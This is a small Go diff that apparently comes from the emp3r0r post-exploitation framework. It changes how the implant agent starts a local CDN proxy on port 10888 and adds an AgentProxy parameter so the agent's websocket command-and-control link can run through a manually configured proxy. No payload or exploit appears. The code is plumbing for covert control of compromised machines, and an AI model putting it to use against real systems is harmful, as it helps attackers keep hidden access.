@@ -155,8 +155,9 @@ func main() {
 				dns = emp3r0r_data.DoHServer
 			}
 
-			// you can change DoH server here if needed
-			err := cdn2proxy.StartProxy("127.0.0.1:10888", emp3r0r_data.CDNProxy, dns)
+			// typically you need to configure AgentProxy manually if agent doesn't have internet
+			// and AgentProxy will be used for websocket connection, then replaced with 10888
+			err := cdn2proxy.StartProxy("127.0.0.1:10888", emp3r0r_data.CDNProxy, emp3r0r_data.AgentProxy, dns)
 			if err != nil {
 				log.Fatal(err)
 			}
